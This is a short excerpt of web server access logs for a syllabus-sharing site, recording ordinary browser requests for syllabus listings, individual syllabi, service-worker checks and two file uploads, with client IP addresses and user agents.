2600:1017:b414:9b2:4142:3972:2fbb:131d - - [01/Sep/2024:05:14:48 +0000] "GET /api/syllabi HTTP/1.1" 200 5486 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
2600:1017:b414:9b2:4142:3972:2fbb:131d - - [01/Sep/2024:05:15:00 +0000] "GET /api/syllabi/32 HTTP/1.1" 200 258235 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:05:15:03 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:15:11 +0000] "POST /api/upload HTTP/1.1" 200 165 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:15:40 +0000] "GET /api/syllabi/38 HTTP/1.1" 200 213948 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:15:42 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:15:45 +0000] "GET /api/syllabi/33 HTTP/1.1" 200 122443 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.14.162.213 - - [01/Sep/2024:05:15:45 +0000] "POST /api/upload HTTP/1.1" 200 166 "https://syllabus.website/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
98.113.158.59 - - [01/Sep/2024:05:15:47 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:15:49 +0000] "GET /api/syllabi/30 HTTP/1.1" 200 199063 "https://syllabus.website/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
98.113.158.59 - - [01/Sep/2024:05:15:50 +0000] "GET /sw.js HTTP/1.1" 304 - "https://syllabus.website/sw.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
